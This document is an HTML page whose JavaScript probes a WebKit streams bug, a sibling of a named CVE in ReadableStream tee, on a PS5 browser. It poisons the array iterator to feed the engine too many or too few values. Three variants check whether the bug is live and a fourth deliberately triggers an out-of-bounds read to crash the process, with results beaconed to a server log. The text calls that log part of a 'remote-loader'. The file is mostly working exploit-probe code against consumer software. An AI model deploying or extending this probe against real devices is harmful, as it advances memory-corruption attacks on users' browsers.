<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<title>CAND-A tee sibling liveness (PS5 14.20)</title>
</head>
<body>
<pre id="out">CAND-A / TEE-EXT liveness — the InternalReadableStream::tee sibling of CVE-2026-43705
4 crash-safe variants (control -> size discriminators -> crash oracle). Verdict is server-side.
</pre>
<script>
/*
 * TEE-EXT liveness probe (2026-10-15)
 *
 * The 43705 fix (8fd92b1 / 316203@main) replaced ASSERT(results.size()==3) with a runtime size check plus
 * jsDynamicCast null-checks INSIDE WebCore/Modules/streams/TransformStream.cpp ONLY. The identical defect shape
 * survives at InternalReadableStream::tee:
 *     WebCore/bindings/js/InternalReadableStream.cpp:191-195
 *       auto results = Detail::SequenceConverter<IDLObject>::convert(*globalObject, result);  // :191
 *       ASSERT(results.size() == 2);                                                          // :192 debug-only
 *       return std::make_pair(fromObject(*results[0].get()), fromObject(*results[1].get()));  // :195
 * The builtin `readableStreamTee` (ReadableStreamInternals.js:585-628) returns [branch1, branch2]; the C++ side
 * consumes it through the JS ITERATION protocol (JSDOMConvertSequences.h:42-63 -> forEachInIterable,
 * IteratorOperations.h:62-101). getIterationMode (IteratorOperations.cpp:260-281) leaves the fast path as soon as
 * Array.prototype[Symbol.iterator] is overridden, so our iterator is consulted and yields arbitrary JSObjects.
 * Reachable from plain JS via ReadableStream.idl:42 (rs.tee() -> ReadableStream.cpp:74-87) and
 * FetchBody.cpp:316-323 (Response(body).clone() -> FetchResponse.cpp:185-212). JIT-free.
 *
 * WHY THE DISCRIMINATOR IS OVER-YIELD, NOT WRONG-SHAPE: the two expected values are internal stream RECORDS,
 * which in the builtin are plain objects (`const stream = { }`, ReadableStreamInternals.js:33) carrying private
 * slots. Converter<IDLObject> (JSDOMConvertObject.h:34-50) already throws for primitives and accepts any object,
 * so "one more object" is indistinguishable from a real record by any type test. The ONLY missing guard at :192
 * is the SIZE check -> the probe must change the VALUE COUNT. (2 wrong-shaped objects pass even a fully patched
 * build.) Wrong-shape is still used in V3 to show confusion TRAVEL, not to discriminate.
 *
 * Beacon protocol (same as cve-43705-livetest.html): synchronous same-origin POST /beacon/<stage>/<run>,
 * run = per-render nonce. Sync XHR => A is fully sent before the trigger, so "A<n> with no B<n>/E<n>" is an
 * unambiguous crash signature.
 *
 * BODY FORMAT (fixed prefix, expected byte): every body after L / U / U3 is
 *     BUGLIVE=<true|false>;...
 * i.e. the literal token BUGLIVE starts at byte 0 and its value starts at byte 8 (C0, B<n>, E<n>, Z).
 * B<n> = survived, E<n> = a guard threw (Expected). Extra fields follow after ';' (never contain ';').
 *
 * D-SEQUENCE (one pair per variant): A1->B1, A2->B2, A3->B3, A4->B4 (or E<n> instead of B<n>).
 *
 * READING host-beacons.log:
 *   C0 cleanTeeOk=false           -> surface absent; no verdict
 *   B1 hook=armed                 -> the poison hook IS consulted (harness valid); proceed
 *   B1 hook=blunt                 -> hook not consulted / 43705 unexpectedly live => tee verdicts inconclusive
 *   B2 BUGLIVE=true               -> tee over-yield survived        = SIBLING LIVE (safe proof, no crash)
 *   B3 BUGLIVE=true bodyPresent=true  -> ditto through Response.clone = SIBLING LIVE + confusion travel (safe)
 *   B3 BUGLIVE=false bodyPresent=false -> tee threw inside clone (size check) = guard present
 *   E2 / E3 (TypeError)           -> runtime size guard present = dead on this build
 *   A4 with NO B4/E4              -> under-yield past-end read crashed => LIVE (web process only; reload #s4)
 *   Z                             -> full 4-variant run completed without crashing
 *   L only / U / U3               -> no verdict for that surface
 *
 * Reload with #s0 (clean control only) or #s1..#s4 to re-run ONLY that variant (use after a crash).
 */
(function () {
  "use strict";
  var out = document.getElementById("out");
  function say(s) { try { out.textContent += s + "\n"; } catch (e) {} }

  var run = "t" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8);

  function beacon(stage, body) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/beacon/" + stage + "/" + run, false);
      x.setRequestHeader("Content-Type", "text/plain;charset=utf-8");
      x.send(body || "");
    } catch (e) { /* logging must never throw */ }
  }

  function clean(s) { return String(s).replace(/[;\r\n]+/g, ",").slice(0, 180); }
  function errStr(e) {
    return (e && e.name) ? (e.name + "|" + clean(e.message || "")) : clean(e);
  }

  var origIter = Array.prototype[Symbol.iterator];
  var hookState = "unknown";

  function bBody(buglive, n, threw, sig, extra) {
    return "BUGLIVE=" + (buglive ? "true" : "false") +
           ";n=" + n + ";threw=" + (threw || "none") +
           ";sig=" + clean(sig) + ";hook=" + hookState + ";extra=" + clean(extra);
  }

  say("run=" + run);
  say("UA=" + navigator.userAgent);
  beacon("L", "page loaded; ua=" + navigator.userAgent);

  if (typeof ReadableStream === "undefined") {
    beacon("U", "ReadableStream undefined; ua=" + navigator.userAgent);
    say("UNSUPPORTED: no ReadableStream");
    return;
  }
  var haveResponse = (typeof Response !== "undefined");

  // Unpoisoned controls: the surfaces must work at all before we trust any poison verdict.
  var cleanTeeOk = false;
  try { cleanTeeOk = (new ReadableStream({ start: function (c) {} }).tee().length === 2); } catch (e) {}
  // V3 preflight: a Response built from a stream must construct, else V3 is skipped (keeps a construction error
  // from being misread as a tee guard).
  var respStreamOk = false;
  if (haveResponse) {
    try { new Response(new ReadableStream({ start: function (c) {} })); respStreamOk = true; } catch (e) {}
  }
  beacon("C0", "BUGLIVE=false;CONTROL;cleanTeeOk=" + cleanTeeOk + ";respStreamOk=" + respStreamOk);

  // ---- poisoned iterators -------------------------------------------------
  // All return a function used as Array.prototype[Symbol.iterator]; `this` = the builtin's returned array.
  function poisonOverYield() {           // arr.length + 1 values, real records first (pure size probe)
    return function () {
      var arr = this, i = 0, n = arr.length + 1;
      return { next: function () {
        if (i >= n) return { done: true };
        var v = (i < arr.length) ? arr[i] : {};
        i++;
        return { value: v, done: false };
      }};
    };
  }
  function poisonOverYieldWrongShape() { // arr.length + 1 values, ALL plain objects (size probe + confusion travel)
    return function () {
      var arr = this, i = 0, n = arr.length + 1;
      return { next: function () {
        if (i >= n) return { done: true };
        var v = { fake: i };
        i++;
        return { value: v, done: false };
      }};
    };
  }
  function poisonUnderYield() {          // exactly 1 value for a 2-array -> results[1] reads past the end
    return function () {
      var arr = this, i = 0, n = (arr.length >= 2) ? 1 : arr.length;
      return { next: function () {
        if (i >= n) return { done: true };
        var v = { fake: i };
        i++;
        return { value: v, done: false };
      }};
    };
  }

  // Runs one variant: A<n> -> {poison, work, restore} -> classify -> B<n> or E<n>. Never throws.
  function runVariant(n, desc, poison, work, classify) {
    beacon("A" + n, "A" + n + ";" + desc);
    say("v" + n + "  " + desc);
    var threw = null, res = null;
    try {
      try { Array.prototype[Symbol.iterator] = poison(); }
      catch (e0) { threw = errStr(e0); }
      if (threw === null) {
        try { res = work(); }
        catch (e1) { threw = errStr(e1); }
      }
    } finally {
      try { Array.prototype[Symbol.iterator] = origIter; } catch (e2) {}   // skipped only on crash
    }
    var v;
    try { v = classify(threw, res); }
    catch (e3) { v = { kind: "B", buglive: false, sig: "classifyThrew", extra: errStr(e3) }; }
    if (v.kind === "E") {
      beacon("E" + n, "BUGLIVE=false;GUARD;n=" + n + ";threw=" + clean(v.extra) + ";hook=" + hookState);
      say("v" + n + "  GUARD " + v.extra);
    } else {
      beacon("B" + n, bBody(v.buglive, n, threw, v.sig, v.extra));
      say("v" + n + "  " + (v.buglive ? "BUGLIVE=true" : "no-bug") + "  " + v.sig + "  " + v.extra);
    }
    return true;
  }

  function isTypeError(threw) { return !!threw && threw.indexOf("TypeError") === 0; }
  function guardOrOther(threw) {
    if (isTypeError(threw)) return { kind: "E", buglive: false, extra: threw };
    return { kind: "B", buglive: false, sig: "otherThrow", extra: threw };
  }

  // ---- V1: hook validity control (TransformStream = the 43705 site, live-confirmed fixed on 14.20) ----
  function v1() {
    return runVariant(1, "control: new TransformStream() + over-yield (does the engine read our iterator?)",
      poisonOverYield, function () {
        var ts = new TransformStream();
        return { r: ts.readable, w: ts.writable };
      }, function (threw, res) {
        hookState = isTypeError(threw) ? "armed" : "blunt";
        return { kind: "B", buglive: false,
                 sig: (hookState === "armed") ? "hookArmed" : "hookBlunt",
                 extra: "threw=" + (threw || "none") };
      });
  }

  // ---- V2: tee over-yield (SIZE discriminator, safe pre-fix) ----
  function v2() {
    return runVariant(2, "rs.tee() + over-yield (2 -> 3 values)",
      poisonOverYield, function () {
        return { pair: new ReadableStream({ start: function (c) {} }).tee() };
      }, function (threw, res) {
        if (threw) return guardOrOther(threw);
        var len = -1, locked = "n/a";
        try { len = res.pair.length; } catch (e) {}
        try { locked = String(res.pair[0].locked); } catch (e) { locked = "throw"; }
        return { kind: "B", buglive: true, sig: "survived",
                 extra: "pairLen=" + len + ";p0locked=" + locked };
      });
  }

  // ---- V3: Response.clone over-yield + wrong-shape (SIZE discriminator through FetchBody + travel) ----
  function v3() {
    if (!respStreamOk) { beacon("U3", "Response(stream) unavailable; V3 skipped"); return true; }
    return runVariant(3, "new Response(stream).clone() + over-yield wrong-shape (2 -> 3 objects)",
      poisonOverYieldWrongShape, function () {
        var r = new Response(new ReadableStream({ start: function (c) {} }));
        return { r2: r.clone() };
      }, function (threw, res) {
        if (threw) return guardOrOther(threw);
        // FetchBody.cpp:318-323 swallows a tee Exception -> clone body stays null (no throw either way).
        var present = false, isStream = false;
        try { present = (res.r2.body !== null && res.r2.body !== undefined); } catch (e) {}
        try { isStream = (res.r2.body instanceof ReadableStream); } catch (e) {}
        return { kind: "B", buglive: present, sig: "survived",
                 extra: "bodyPresent=" + present + ";bodyIsStream=" + isStream };
      });
  }

  // ---- V4: crash oracle, LAST (under-yield 1 value -> results[1] past-end read at :195) ----
  function v4() {
    return runVariant(4, "rs.tee() + under-yield (2 -> 1 value) [crash oracle, runs last]",
      poisonUnderYield, function () {
        return { pair: new ReadableStream({ start: function (c) {} }).tee() };
      }, function (threw, res) {
        if (threw) return guardOrOther(threw);
        var len = -1;
        try { len = res.pair.length; } catch (e) {}
        return { kind: "B", buglive: false, sig: "survivedUnderYield", extra: "pairLen=" + len };
      });
  }

  var stages = [v1, v2, v3, v4];
  var only = (location.hash || "").replace(/^#s?/, "");

  try {
    if (only === "0") {
      say("clean control only (#s0): cleanTeeOk=" + cleanTeeOk + " respStreamOk=" + respStreamOk);
    } else if (/^[1-4]$/.test(only)) {
      say("single-variant mode #s" + only + " (hook control skipped)");
      stages[Number(only) - 1]();
    } else {
      for (var i = 0; i < stages.length; i++) stages[i]();
      beacon("Z", "BUGLIVE=false;ALLDONE;hook=" + hookState + ";variants=4;run=" + run);
      say("");
      say("done. verdict is server-side: ps5-webkit-remote-loader/host-beacons.log");
    }
  } catch (e) {
    say("harness error (not a verdict): " + errStr(e));
  }
})();
</script>
</body>
</html>
